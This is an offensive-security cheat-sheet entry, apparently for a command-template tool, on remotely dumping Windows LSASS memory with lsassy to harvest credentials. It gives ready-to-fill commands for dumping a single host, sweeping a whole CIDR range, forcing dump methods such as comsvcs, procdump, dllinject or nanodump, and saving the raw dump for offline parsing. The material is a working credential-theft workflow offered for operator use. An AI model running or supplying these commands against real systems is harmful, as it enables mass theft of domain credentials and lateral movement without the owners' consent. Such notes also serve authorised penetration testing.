---
technique: Remote LSASS Dumping with lsassy
category: credential-access
targets: Windows Workstation, Windows Server
protocols: SMB, RPC
remote_capable: true
tags: windows credentials lsass lsassy remote-dumping pypykatz
---

# Remote LSASS Dumping with lsassy

lsassy remotely dumps LSASS, retrieves the dump, parses credentials locally, and removes remote artifacts. Use it when credentials provide administrative access and a remote LSASS workflow is acceptable.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative access | The supplied account needs rights to dump LSASS remotely |
| SMB/RPC reachability | lsassy needs remote service and file operations |
| Dump method | Pick a dump method that matches target defenses and available tooling |

## Windows

No Windows operator command is included here. This note covers Linux-side lsassy usage.

## Linux

### Single host

#lsassy #lsass

Dump LSASS on one target and parse credentials locally.

```sh title:"Dump LSASS on one host with lsassy"
lsassy -d $domain -u $user $auth_flags $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
-->

### CIDR sweep

#lsassy #lsass

Attempt remote LSASS dumping across a CIDR range where credentials work.

```sh title:"Sweep CIDR with lsassy"
lsassy -d $domain -u $user $auth_flags $cidr
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var cidr
-->

### Force dump method

#lsassy #lsass

Force a specific dump method such as `comsvcs`, `procdump`, `dllinject`, or `nanodump`.

```sh title:"Force lsassy dump method"
lsassy -d $domain -u $user $auth_flags -m $dump_method $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var dump_method
-->

### Keep raw dump

#lsassy #lsass

Save the raw LSASS dump for offline parsing.

```sh title:"Keep raw LSASS dump with lsassy"
lsassy -d $domain -u $user $auth_flags -r --dumpfile $dump_path $rhost_ip
```
<!-- cheat
import domain_ip
import users
import lsassy_auth
var dump_path
-->
